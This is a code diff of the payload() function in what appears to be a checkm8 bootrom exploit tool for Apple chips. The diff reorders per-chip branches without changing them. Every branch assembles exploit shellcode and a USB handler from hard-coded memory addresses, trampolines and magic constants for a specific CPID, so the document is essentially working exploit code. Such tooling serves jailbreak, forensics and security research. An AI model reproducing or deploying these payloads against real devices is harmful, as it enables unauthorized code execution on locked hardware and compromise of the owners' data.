@@ -236,138 +236,39 @@ PAYLOAD_SIZE_ARM64 = 576
 
 
 def payload(cpid):
-    if cpid == 0x8947:
-        constants_usb_s5l8947x = ConstantsUSB(
-            0x34000000,  # 1 - LOAD_ADDRESS
-            0x65786563,  # 2 - EXEC_MAGIC
-            0x646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D73,  # 5 - MEMS_MAGIC
-            0x79EC + 1,  # 6 - USB_CORE_DO_IO
-        )
-        constants_checkm8_s5l8947x = OffsetsCheckm8(
-            0x3402D87C,  # 1 - gUSBDescriptors
-            0x3402DDF8,  # 2 - gUSBSerialNumber
-            0x72A8 + 1,  # 3 - usb_create_string_descriptor
-            0x3402C2DA,  # 4 - gUSBSRNMStringDescriptor
-            0x34039800,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARMV7,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARMV7,  # 7 - PAYLOAD_SIZE
-            0x3402D92C,  # 8 - PAYLOAD_PTR
-        )
-        s5l8947x_handler = (
-            asm_thumb_trampoline(0x34039800 + 1, 0x7BC8 + 1)
-            + prepare_shellcode("usb_0xA1_2_armv7", constants_usb_s5l8947x)[8:]
-        )
-        s5l8947x_shellcode = prepare_shellcode(
-            "checkm8_armv7", constants_checkm8_s5l8947x
-        )
-        assert len(s5l8947x_shellcode) <= PAYLOAD_OFFSET_ARMV7
-        assert len(s5l8947x_handler) <= PAYLOAD_SIZE_ARMV7
-        return (
-            s5l8947x_shellcode
-            + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(s5l8947x_shellcode))
-            + s5l8947x_handler
-        )
-    if cpid == 0x8950:
-        constants_usb_s5l8950x = ConstantsUSB(
-            0x10000000,  # 1 - LOAD_ADDRESS
-            0x65786563,  # 2 - EXEC_MAGIC
-            0x646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D73,  # 5 - MEMS_MAGIC
-            0x7620 + 1,  # 6 - USB_CORE_DO_IO
-        )
-        constants_checkm8_s5l8950x = OffsetsCheckm8(
-            0x10061988,  # 1 - gUSBDescriptors
-            0x10061F80,  # 2 - gUSBSerialNumber
-            0x7C54 + 1,  # 3 - usb_create_string_descriptor
-            0x100600D8,  # 4 - gUSBSRNMStringDescriptor
-            0x10079800,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARMV7,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARMV7,  # 7 - PAYLOAD_SIZE
-            0x10061A24,  # 8 - PAYLOAD_PTR
-        )
-        s5l8950x_handler = (
-            asm_thumb_trampoline(0x10079800 + 1, 0x8160 + 1)
-            + prepare_shellcode("usb_0xA1_2_armv7", constants_usb_s5l8950x)[8:]
-        )
-        s5l8950x_shellcode = prepare_shellcode(
-            "checkm8_armv7", constants_checkm8_s5l8950x
-        )
-        assert len(s5l8950x_shellcode) <= PAYLOAD_OFFSET_ARMV7
-        assert len(s5l8950x_handler) <= PAYLOAD_SIZE_ARMV7
-        return (
-            s5l8950x_shellcode
-            + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(s5l8950x_shellcode))
-            + s5l8950x_handler
-        )
-    if cpid == 0x8955:
-        constants_usb_s5l8955x = ConstantsUSB(
-            0x10000000,  # 1 - LOAD_ADDRESS
-            0x65786563,  # 2 - EXEC_MAGIC
-            0x646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D73,  # 5 - MEMS_MAGIC
-            0x7660 + 1,  # 6 - USB_CORE_DO_IO
-        )
-        constants_checkm8_s5l8955x = OffsetsCheckm8(
-            0x10061988,  # 1 - gUSBDescriptors
-            0x10061F80,  # 2 - gUSBSerialNumber
-            0x7C94 + 1,  # 3 - usb_create_string_descriptor
-            0x100600D8,  # 4 - gUSBSRNMStringDescriptor
-            0x10079800,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARMV7,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARMV7,  # 7 - PAYLOAD_SIZE
-            0x10061A24,  # 8 - PAYLOAD_PTR
-        )
-        s5l8955x_handler = (
-            asm_thumb_trampoline(0x10079800 + 1, 0x81A0 + 1)
-            + prepare_shellcode("usb_0xA1_2_armv7", constants_usb_s5l8955x)[8:]
-        )
-        s5l8955x_shellcode = prepare_shellcode(
-            "checkm8_armv7", constants_checkm8_s5l8955x
-        )
-        assert len(s5l8955x_shellcode) <= PAYLOAD_OFFSET_ARMV7
-        assert len(s5l8955x_handler) <= PAYLOAD_SIZE_ARMV7
-        return (
-            s5l8955x_shellcode
-            + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(s5l8955x_shellcode))
-            + s5l8955x_handler
-        )
-    if cpid == 0x8960:
-        constants_usb_s5l8960x = ConstantsUSB(
+    if cpid == 0x7000:
+        constants_usb_s7000 = ConstantsUSB(
             0x180380000,  # 1 - LOAD_ADDRESS
             0x6578656365786563,  # 2 - EXEC_MAGIC
             0x646F6E65646F6E65,  # 3 - DONE_MAGIC
             0x6D656D636D656D63,  # 4 - MEMC_MAGIC
             0x6D656D736D656D73,  # 5 - MEMS_MAGIC
-            0x10000CC78,  # 6 - USB_CORE_DO_IO
+            0x10000EBB4,  # 6 - USB_CORE_DO_IO
         )
-        constants_checkm8_s5l8960x = OffsetsCheckm8(
-            0x180086B58,  # 1 - gUSBDescriptors
-            0x180086CDC,  # 2 - gUSBSerialNumber
-            0x10000BFEC,  # 3 - usb_create_string_descriptor
-            0x180080562,  # 4 - gUSBSRNMStringDescriptor
-            0x18037FC00,  # 5 - PAYLOAD_DEST
+        constants_checkm8_s7000 = OffsetsCheckm8(
+            0x180088760,  # 1 - gUSBDescriptors
+            0x1800888C8,  # 2 - gUSBSerialNumber
+            0x10000E074,  # 3 - usb_create_string_descriptor
+            0x18008062A,  # 4 - gUSBSRNMStringDescriptor
+            0x1800E0C00,  # 5 - PAYLOAD_DEST
             PAYLOAD_OFFSET_ARM64,  # 6 - PAYLOAD_OFFSET
             PAYLOAD_SIZE_ARM64,  # 7 - PAYLOAD_SIZE
-            0x180086C70,  # 8 - PAYLOAD_PTR
+            0x180088878,  # 8 - PAYLOAD_PTR
         )
-        s5l8960x_handler = (
-            asm_arm64_x7_trampoline(0x10000CFB4)
+        s7000_handler = (
+            asm_arm64_x7_trampoline(0x10000EEE4)
             + asm_arm64_branch(0x10, 0x0)
-            + prepare_shellcode("usb_0xA1_2_arm64", constants_usb_s5l8960x)[4:]
+            + prepare_shellcode("usb_0xA1_2_arm64", constants_usb_s7000)[4:]
         )
-        s5l8960x_shellcode = prepare_shellcode(
-            "checkm8_arm64", constants_checkm8_s5l8960x
+        s7000_shellcode = prepare_shellcode(
+            "checkm8_nopaddingcorruption_arm64", constants_checkm8_s7000
         )
-        assert len(s5l8960x_shellcode) <= PAYLOAD_OFFSET_ARM64
-        assert len(s5l8960x_handler) <= PAYLOAD_SIZE_ARM64
+        assert len(s7000_shellcode) <= PAYLOAD_OFFSET_ARM64
+        assert len(s7000_handler) <= PAYLOAD_SIZE_ARM64
         return (
-            s5l8960x_shellcode
-            + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(s5l8960x_shellcode))
-            + s5l8960x_handler
+            s7000_shellcode
+            + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(s7000_shellcode))
+            + s7000_handler
         )
     if cpid == 0x8002:
         constants_usb_t8002 = ConstantsUSB(
@@ -399,6 +300,43 @@ def payload(cpid):
             t8002_shellcode
             + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(t8002_shellcode))
             + t8002_handler
+        )
+    if cpid == 0x8003:
+        constants_usb_s8003 = ConstantsUSB(
+            0x180380000,  # 1 - LOAD_ADDRESS
+            0x6578656365786563,  # 2 - EXEC_MAGIC
+            0x646F6E65646F6E65,  # 3 - DONE_MAGIC
+            0x6D656D636D656D63,  # 4 - MEMC_MAGIC
+            0x6D656D736D656D73,  # 5 - MEMS_MAGIC
+            0x10000EE78,  # 6 - USB_CORE_DO_IO
+        )
+        constants_checkm8_s8003 = OffsetsCheckm8(
+            0x1800877E0,  # 1 - gUSBDescriptors
+            0x180087958,  # 2 - gUSBSerialNumber
+            0x10000E354,  # 3 - usb_create_string_descriptor
+            0x1800807DA,  # 4 - gUSBSRNMStringDescriptor
+            0x1800E0C00,  # 5 - PAYLOAD_DEST
+            PAYLOAD_OFFSET_ARM64,  # 6 - PAYLOAD_OFFSET
+            PAYLOAD_SIZE_ARM64,  # 7 - PAYLOAD_SIZE
+            0x1800878F8,  # 8 - PAYLOAD_PTR
+        )
+        s8003_handler = (
+            asm_arm64_x7_trampoline(0x10000F1B0)
+            + asm_arm64_branch(0x10, 0x0)
+            + prepare_shellcode("usb_0xA1_2_arm64", constants_usb_s8003)[4:]
+        )
+        s8003_shellcode = prepare_shellcode(
+            "checkm8_nopaddingcorruption_arm64", constants_checkm8_s8003
+        )
+
+        assert len(s8003_shellcode) <= PAYLOAD_OFFSET_ARM64
+
+        assert len(s8003_handler) <= PAYLOAD_SIZE_ARM64
+
+        return (
+            s8003_shellcode
+            + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(s8003_shellcode))
+            + s8003_handler
         )
     if cpid == 0x8004:
         constants_usb_t8004 = ConstantsUSB(
@@ -551,78 +489,6 @@ def payload(cpid):
             0x1800006A5,
             prepare_shellcode("t8010_t8011_disable_wxn_arm64"),
         ) + usb_rop_callbacks(0x1800B0800, t8011_func_gadget, t8011_callbacks)
-    if cpid == 0x7000:
-        constants_usb_s7000 = ConstantsUSB(
-            0x180380000,  # 1 - LOAD_ADDRESS
-            0x6578656365786563,  # 2 - EXEC_MAGIC
-            0x646F6E65646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D636D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D736D656D73,  # 5 - MEMS_MAGIC
-            0x10000EBB4,  # 6 - USB_CORE_DO_IO
-        )
-        constants_checkm8_s7000 = OffsetsCheckm8(
-            0x180088760,  # 1 - gUSBDescriptors
-            0x1800888C8,  # 2 - gUSBSerialNumber
-            0x10000E074,  # 3 - usb_create_string_descriptor
-            0x18008062A,  # 4 - gUSBSRNMStringDescriptor
-            0x1800E0C00,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARM64,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARM64,  # 7 - PAYLOAD_SIZE
-            0x180088878,  # 8 - PAYLOAD_PTR
-        )
-        s7000_handler = (
-            asm_arm64_x7_trampoline(0x10000EEE4)
-            + asm_arm64_branch(0x10, 0x0)
-            + prepare_shellcode("usb_0xA1_2_arm64", constants_usb_s7000)[4:]
-        )
-        s7000_shellcode = prepare_shellcode(
-            "checkm8_nopaddingcorruption_arm64", constants_checkm8_s7000
-        )
-        assert len(s7000_shellcode) <= PAYLOAD_OFFSET_ARM64
-        assert len(s7000_handler) <= PAYLOAD_SIZE_ARM64
-        return (
-            s7000_shellcode
-            + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(s7000_shellcode))
-            + s7000_handler
-        )
-
-    if cpid == 0x8003:
-        constants_usb_s8003 = ConstantsUSB(
-            0x180380000,  # 1 - LOAD_ADDRESS
-            0x6578656365786563,  # 2 - EXEC_MAGIC
-            0x646F6E65646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D636D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D736D656D73,  # 5 - MEMS_MAGIC
-            0x10000EE78,  # 6 - USB_CORE_DO_IO
-        )
-        constants_checkm8_s8003 = OffsetsCheckm8(
-            0x1800877E0,  # 1 - gUSBDescriptors
-            0x180087958,  # 2 - gUSBSerialNumber
-            0x10000E354,  # 3 - usb_create_string_descriptor
-            0x1800807DA,  # 4 - gUSBSRNMStringDescriptor
-            0x1800E0C00,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARM64,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARM64,  # 7 - PAYLOAD_SIZE
-            0x1800878F8,  # 8 - PAYLOAD_PTR
-        )
-        s8003_handler = (
-            asm_arm64_x7_trampoline(0x10000F1B0)
-            + asm_arm64_branch(0x10, 0x0)
-            + prepare_shellcode("usb_0xA1_2_arm64", constants_usb_s8003)[4:]
-        )
-        s8003_shellcode = prepare_shellcode(
-            "checkm8_nopaddingcorruption_arm64", constants_checkm8_s8003
-        )
-
-        assert len(s8003_shellcode) <= PAYLOAD_OFFSET_ARM64
-
-        assert len(s8003_handler) <= PAYLOAD_SIZE_ARM64
-
-        return (
-            s8003_shellcode
-            + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(s8003_shellcode))
-            + s8003_handler
-        )
     if cpid == 0x8012:
         constants_usb_t8012 = ConstantsUSB(
             0x18001C000,  # 1 - LOAD_ADDRESS
@@ -748,6 +614,139 @@ def payload(cpid):
             0x180000625,
             t8015_callback_data,
             t8015_shellcode,
+        )
+    if cpid == 0x8947:
+        constants_usb_s5l8947x = ConstantsUSB(
+            0x34000000,  # 1 - LOAD_ADDRESS
+            0x65786563,  # 2 - EXEC_MAGIC
+            0x646F6E65,  # 3 - DONE_MAGIC
+            0x6D656D63,  # 4 - MEMC_MAGIC
+            0x6D656D73,  # 5 - MEMS_MAGIC
+            0x79EC + 1,  # 6 - USB_CORE_DO_IO
+        )
+        constants_checkm8_s5l8947x = OffsetsCheckm8(
+            0x3402D87C,  # 1 - gUSBDescriptors
+            0x3402DDF8,  # 2 - gUSBSerialNumber
+            0x72A8 + 1,  # 3 - usb_create_string_descriptor
+            0x3402C2DA,  # 4 - gUSBSRNMStringDescriptor
+            0x34039800,  # 5 - PAYLOAD_DEST
+            PAYLOAD_OFFSET_ARMV7,  # 6 - PAYLOAD_OFFSET
+            PAYLOAD_SIZE_ARMV7,  # 7 - PAYLOAD_SIZE
+            0x3402D92C,  # 8 - PAYLOAD_PTR
+        )
+        s5l8947x_handler = (
+            asm_thumb_trampoline(0x34039800 + 1, 0x7BC8 + 1)
+            + prepare_shellcode("usb_0xA1_2_armv7", constants_usb_s5l8947x)[8:]
+        )
+        s5l8947x_shellcode = prepare_shellcode(
+            "checkm8_armv7", constants_checkm8_s5l8947x
+        )
+        assert len(s5l8947x_shellcode) <= PAYLOAD_OFFSET_ARMV7
+        assert len(s5l8947x_handler) <= PAYLOAD_SIZE_ARMV7
+        return (
+            s5l8947x_shellcode
+            + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(s5l8947x_shellcode))
+            + s5l8947x_handler
+        )
+    if cpid == 0x8950:
+        constants_usb_s5l8950x = ConstantsUSB(
+            0x10000000,  # 1 - LOAD_ADDRESS
+            0x65786563,  # 2 - EXEC_MAGIC
+            0x646F6E65,  # 3 - DONE_MAGIC
+            0x6D656D63,  # 4 - MEMC_MAGIC
+            0x6D656D73,  # 5 - MEMS_MAGIC
+            0x7620 + 1,  # 6 - USB_CORE_DO_IO
+        )
+        constants_checkm8_s5l8950x = OffsetsCheckm8(
+            0x10061988,  # 1 - gUSBDescriptors
+            0x10061F80,  # 2 - gUSBSerialNumber
+            0x7C54 + 1,  # 3 - usb_create_string_descriptor
+            0x100600D8,  # 4 - gUSBSRNMStringDescriptor
+            0x10079800,  # 5 - PAYLOAD_DEST
+            PAYLOAD_OFFSET_ARMV7,  # 6 - PAYLOAD_OFFSET
+            PAYLOAD_SIZE_ARMV7,  # 7 - PAYLOAD_SIZE
+            0x10061A24,  # 8 - PAYLOAD_PTR
+        )
+        s5l8950x_handler = (
+            asm_thumb_trampoline(0x10079800 + 1, 0x8160 + 1)
+            + prepare_shellcode("usb_0xA1_2_armv7", constants_usb_s5l8950x)[8:]
+        )
+        s5l8950x_shellcode = prepare_shellcode(
+            "checkm8_armv7", constants_checkm8_s5l8950x
+        )
+        assert len(s5l8950x_shellcode) <= PAYLOAD_OFFSET_ARMV7
+        assert len(s5l8950x_handler) <= PAYLOAD_SIZE_ARMV7
+        return (
+            s5l8950x_shellcode
+            + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(s5l8950x_shellcode))
+            + s5l8950x_handler
+        )
+    if cpid == 0x8955:
+        constants_usb_s5l8955x = ConstantsUSB(
+            0x10000000,  # 1 - LOAD_ADDRESS
+            0x65786563,  # 2 - EXEC_MAGIC
+            0x646F6E65,  # 3 - DONE_MAGIC
+            0x6D656D63,  # 4 - MEMC_MAGIC
+            0x6D656D73,  # 5 - MEMS_MAGIC
+            0x7660 + 1,  # 6 - USB_CORE_DO_IO
+        )
+        constants_checkm8_s5l8955x = OffsetsCheckm8(
+            0x10061988,  # 1 - gUSBDescriptors
+            0x10061F80,  # 2 - gUSBSerialNumber
+            0x7C94 + 1,  # 3 - usb_create_string_descriptor
+            0x100600D8,  # 4 - gUSBSRNMStringDescriptor
+            0x10079800,  # 5 - PAYLOAD_DEST
+            PAYLOAD_OFFSET_ARMV7,  # 6 - PAYLOAD_OFFSET
+            PAYLOAD_SIZE_ARMV7,  # 7 - PAYLOAD_SIZE
+            0x10061A24,  # 8 - PAYLOAD_PTR
+        )
+        s5l8955x_handler = (
+            asm_thumb_trampoline(0x10079800 + 1, 0x81A0 + 1)
+            + prepare_shellcode("usb_0xA1_2_armv7", constants_usb_s5l8955x)[8:]
+        )
+        s5l8955x_shellcode = prepare_shellcode(
+            "checkm8_armv7", constants_checkm8_s5l8955x
+        )
+        assert len(s5l8955x_shellcode) <= PAYLOAD_OFFSET_ARMV7
+        assert len(s5l8955x_handler) <= PAYLOAD_SIZE_ARMV7
+        return (
+            s5l8955x_shellcode
+            + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(s5l8955x_shellcode))
+            + s5l8955x_handler
+        )
+    if cpid == 0x8960:
+        constants_usb_s5l8960x = ConstantsUSB(
+            0x180380000,  # 1 - LOAD_ADDRESS
+            0x6578656365786563,  # 2 - EXEC_MAGIC
+            0x646F6E65646F6E65,  # 3 - DONE_MAGIC
+            0x6D656D636D656D63,  # 4 - MEMC_MAGIC
+            0x6D656D736D656D73,  # 5 - MEMS_MAGIC
+            0x10000CC78,  # 6 - USB_CORE_DO_IO
+        )
+        constants_checkm8_s5l8960x = OffsetsCheckm8(
+            0x180086B58,  # 1 - gUSBDescriptors
+            0x180086CDC,  # 2 - gUSBSerialNumber
+            0x10000BFEC,  # 3 - usb_create_string_descriptor
+            0x180080562,  # 4 - gUSBSRNMStringDescriptor
+            0x18037FC00,  # 5 - PAYLOAD_DEST
+            PAYLOAD_OFFSET_ARM64,  # 6 - PAYLOAD_OFFSET
+            PAYLOAD_SIZE_ARM64,  # 7 - PAYLOAD_SIZE
+            0x180086C70,  # 8 - PAYLOAD_PTR
+        )
+        s5l8960x_handler = (
+            asm_arm64_x7_trampoline(0x10000CFB4)
+            + asm_arm64_branch(0x10, 0x0)
+            + prepare_shellcode("usb_0xA1_2_arm64", constants_usb_s5l8960x)[4:]
+        )
+        s5l8960x_shellcode = prepare_shellcode(
+            "checkm8_arm64", constants_checkm8_s5l8960x
+        )
+        assert len(s5l8960x_shellcode) <= PAYLOAD_OFFSET_ARM64
+        assert len(s5l8960x_handler) <= PAYLOAD_SIZE_ARM64
+        return (
+            s5l8960x_shellcode
+            + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(s5l8960x_shellcode))
+            + s5l8960x_handler
         )
 
 
